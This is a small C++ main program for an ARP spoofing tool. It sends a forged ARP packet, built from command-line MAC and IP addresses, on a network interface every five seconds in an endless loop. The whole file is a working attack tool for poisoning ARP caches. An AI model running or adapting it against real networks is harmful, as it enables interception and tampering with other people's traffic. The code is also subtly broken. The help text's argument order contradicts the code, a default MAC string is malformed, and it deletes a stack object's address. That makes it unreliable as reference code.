#include <iostream>
#include <unistd.h> /* usleep() */
#include "arppacket.h"

int main(int argc, char* argv[])
{
    if(argc == 1){
        std::cout << "Help: ./arpspoof sourceMAC targetMAC sourceIP targetIP interface" << std::endl;
        return 0;
    }

    EthernetPacket eth;

    if(argc >= 5){
        eth.setSIP(argv[1]);
        eth.setTIP(argv[2]);
        eth.setSMAC(argv[3]);
        eth.setTMAC(argv[4]);
    } else {
        eth.setSIP("192.168.1.1");
        eth.setTIP("192.168.1.1");
        eth.setSMAC("1:2:3:4:5:6");
        eth.setTMAC("0xff:0xff:0xff:0xff:0xff:0xff");
    }
    std::cout << eth << std::endl;

    EthernetPacket * e = &eth;
    while(1){
        if(argc != 6){
            std::string ifname = "lo\0";
            sendPacket(e, ifname);
        } else {
            sendPacket(e, argv[5]);
        }
        // std::cout << "reply sent" << std::endl;
        usleep(5*1000000);
    }

    delete e;

    return 0;
}